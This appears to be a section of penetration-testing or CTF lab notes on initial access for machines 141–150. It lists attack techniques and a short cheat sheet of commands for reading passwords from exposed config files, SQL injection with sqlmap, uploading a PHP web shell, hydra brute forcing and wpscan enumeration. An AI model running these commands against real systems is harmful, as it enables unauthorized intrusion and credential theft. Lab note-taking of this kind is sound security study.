## 🔓 Initial Access (Machines 141–150)

### Techniques Observed

- CMS Exploits (e.g., WordPress, Joomla, Drupal)
- Exploitable login forms
- Command injection in user input
- Exposed admin panels or configuration files
- File upload features vulnerable to bypass
- Remote file inclusion or vulnerable endpoints

### Common Tools & Commands

```bash
# Exposed configuration
curl http://<IP>/config.php | grep -i pass

# Login form bypass
sqlmap -u http://<IP>/login.php --data="username=admin&password=admin" --batch --level=5

# File upload
curl -F "file=@shell.php" http://<IP>/upload

# Brute force login
hydra -l admin -P rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# WordPress Exploitation
wpscan --url http://<IP> --enumerate u,vp,vt
```

### Observations

- Machines with login panels on `/admin`, `/portal`, or `/dashboard`
- SQLi and LFI led to authentication bypass on multiple machines
- CVEs exploited: CVE-2019-6339 (Drupal), CVE-2020-25213 (WonderCMS)
- Misconfigured upload filters allowed PHP web shells

### Tags

`#initial-access` `#cms-exploit` `#login-bypass` `#upload-bypass` `#file-inclusion`
